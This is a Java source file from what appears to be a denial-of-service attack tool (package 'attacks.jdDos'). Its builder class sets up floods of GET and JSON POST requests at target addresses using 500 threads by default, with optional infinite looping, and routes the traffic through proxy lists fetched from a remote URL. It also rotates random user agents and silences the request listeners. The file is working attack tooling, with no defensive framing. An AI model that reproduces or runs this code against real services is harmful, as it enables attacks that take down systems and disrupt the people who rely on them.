package gh.sep.attacks.jdDos.thread;

import gh.sep.attacks.jdDos.entity.BalancedRequestProxyRepository;
import gh.sep.attacks.jdDos.entity.Pair;
import gh.sep.attacks.jdDos.entity.RequestProxy;
import gh.sep.attacks.jdDos.entity.RequestProxyRepository;
import gh.sep.attacks.jdDos.helper.RandomUserAgent;
import gh.sep.attacks.jdDos.helper.RemoteProxyUtils;
import gh.sep.attacks.jdDos.request.GetRequest;
import gh.sep.attacks.jdDos.request.JsonPostRequest;
import gh.sep.attacks.jdDos.request.Request;

import java.util.ArrayList;
import java.util.List;

public class RequestThreadGroupRunnersBuilder {
    private List<RequestThreadGroupRunner> list;
    private List<RequestProxy> requestProxies = new ArrayList<>();
    private List<Request> requests = new ArrayList<>();
    private List<Pair<String, String>> headers = new ArrayList<>();
    private RandomUserAgent randomUserAgent;
    private boolean isInfinite = false;
    private int sleep = 0;
    private int threadsCount = 500;
    private RequestProxyRepository requestProxyRepository;

    public RequestThreadGroupRunnersBuilder(RandomUserAgent randomUserAgent) {
        this.randomUserAgent = randomUserAgent;
        initHeaders();
    }

    private void initHeaders() {
        headers.add(new Pair<>("Accept:", "application/json"));
        headers.add(new Pair<>("Connection","keep-alive"));
        headers.add(new Pair<>("Pragma","no-cache"));
        headers.add(new Pair<>("Cache-Control","no-cache"));
    }

    private synchronized RequestProxyRepository getRequestProxyRepository(){
        if(requestProxyRepository == null)
            requestProxyRepository = new BalancedRequestProxyRepository(requestProxies);
        return requestProxyRepository;
    }

    public RequestThreadGroupRunnersBuilder addGetRequestAddress(String address){
        if(requestProxies.size() == 0)
            throw new RuntimeException("First add some request proxies");
        Request request = new GetRequest(address, getRequestProxyRepository());
        request.setRequestListener(new Request.MySilentRequestListener());
        requests.add(request);
        return this;
    }

    public RequestThreadGroupRunnersBuilder readProxiesFromUrl(String address){
        List<RequestProxy> proxies = RemoteProxyUtils.getProxies(address);
        System.out.println("Found " + proxies.size() + " from " + address);
        requestProxies.addAll(proxies);
        return this;
    }

    public RequestThreadGroupRunnersBuilder addPostRequest(String address, String data){
        if(requestProxies.size() == 0)
            throw new RuntimeException("First add some request proxies");
        Request request = new JsonPostRequest(address, data, getRequestProxyRepository());
        request.setRequestListener(new Request.MySilentRequestListener());
        requests.add(request);
        return this;
    }

    public RequestThreadGroupRunnersBuilder addHeader(String name, String value){
        headers.add(new Pair<>(name, value));
        return this;
    }

    public RequestThreadGroupRunnersBuilder addRequestProxy(RequestProxy requestProxy){
        requestProxies.add(requestProxy);
        return this;
    }

    public RequestThreadGroupRunnersBuilder setInfinite(boolean infinite) {
        isInfinite = infinite;
        return this;
    }

    public RequestThreadGroupRunnersBuilder setSleep(int sleep) {
        this.sleep = sleep;
        return this;
    }

    public RequestThreadGroupRunnersBuilder setThreadsCount(int threadsCount) {
        this.threadsCount = threadsCount;
        return this;
    }

    public List<RequestThreadGroupRunner> make() {
        check();

        List<RequestThreadGroupRunner> list = new ArrayList<>();

        int i = threadsCount / requests.size();
        for(Request request: requests){
            setHeaders(request);
            RequestThreadGroupRunner requestThreadGroupRunner;
            if(!isInfinite)
                requestThreadGroupRunner = new RequestThreadGroupRunner(request, i, randomUserAgent, false);
            else{
                requestThreadGroupRunner = new RequestThreadGroupRunner(request, i, randomUserAgent, true);
                if(sleep != 0)
                    requestThreadGroupRunner.setSleep(sleep);
            }
            list.add(requestThreadGroupRunner);
        }

        this.list = list;
        return list;
    }

    private void setHeaders(Request request) {
        for(Pair<String,String> header: this.headers){
            request.addHeader(header.getKey(), header.getValue());
        }
    }

    private void check() {
        if(requests.size() == 0)
            throw new RuntimeException("Addresses size cant be 0");

        if(requestProxies.size() == 0)
            throw new RuntimeException("Request proxies size cant be 0");
    }


    public void explain(){
        make();
        System.out.println("Addresses: ");
        for (RequestThreadGroupRunner requestThreadGroupRunner: list){
            Request request = requestThreadGroupRunner.getSample();
            String address = request.getAddress();
            System.out.println(requestThreadGroupRunner.getThreadsCount() + " threads will make request to "+ address);
        }
        System.out.println("Proxies: ");
        for(RequestProxy requestProxy: requestProxies){
            System.out.println(requestProxy.toString());
        }
        System.out.println("Infinite requests: "+ isInfinite);
        if(isInfinite)
            if(sleep != 0)
                System.out.println("Sleep time: "+ sleep + " ms");
            else
                System.out.println("Sleep time is infinite");
        System.out.println("Total threads count: "+ threadsCount);
    }

    public void clean(){
        list = null;
        requestProxies = new ArrayList<>();
        requests = new ArrayList<>();
        isInfinite = false;
        threadsCount = 500;
    }

}
